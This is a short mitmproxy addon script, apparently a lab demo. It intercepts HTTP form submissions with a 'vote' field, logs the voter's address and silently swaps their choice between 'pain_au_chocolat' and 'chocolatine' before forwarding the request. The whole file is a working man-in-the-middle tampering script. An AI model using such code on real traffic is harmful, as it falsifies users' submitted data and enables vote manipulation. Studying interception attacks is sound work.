import logging
from mitmproxy import http
from urllib.parse import unquote

logger = logging.getLogger(__name__)


def request(flow: http.HTTPFlow):
       if flow.request.urlencoded_form and "vote" in flow.request.urlencoded_form:
              src = flow.client_conn.peername
              vote = unquote(flow.request.urlencoded_form["vote"]).split(":")[1]
              logger.warning(f"Detected possible vote from {src} : {vote}")
              modifiedvote = "Vote :chocolatine" if vote == 'pain_au_chocolat' else 'Vote :pain_au_chocolat'
              flow.request.urlencoded_form["vote"]=modifiedvote
              logger.warning(f"Sent modified vote {modifiedvote} instead of {vote}")